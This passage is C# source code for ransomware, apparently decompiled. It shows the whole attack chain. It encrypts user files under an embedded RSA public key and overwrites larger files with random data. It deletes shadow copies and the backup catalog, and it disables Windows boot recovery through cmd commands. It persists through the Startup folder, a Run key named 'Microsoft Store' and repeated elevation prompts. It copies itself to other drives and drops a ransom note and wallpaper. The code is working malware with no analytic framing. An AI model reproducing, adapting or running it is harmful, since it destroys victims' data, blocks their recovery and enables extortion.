		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>n1x7xmAmpf6mIW+qdZzmk21Md4CJpkrG+/DipKpJmwMlLtHRPHny/xaq4mhbUDXZyMhQkHOfFIuL346wgmOgmWTB4soB2RYV2QPKCoWTuEuJLAIo+5x6Yn/nV7yqoLvmgb+2QmY32Vlr7i45XjZ7Rqlob5GrKrt55iKZ+Av8xvU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
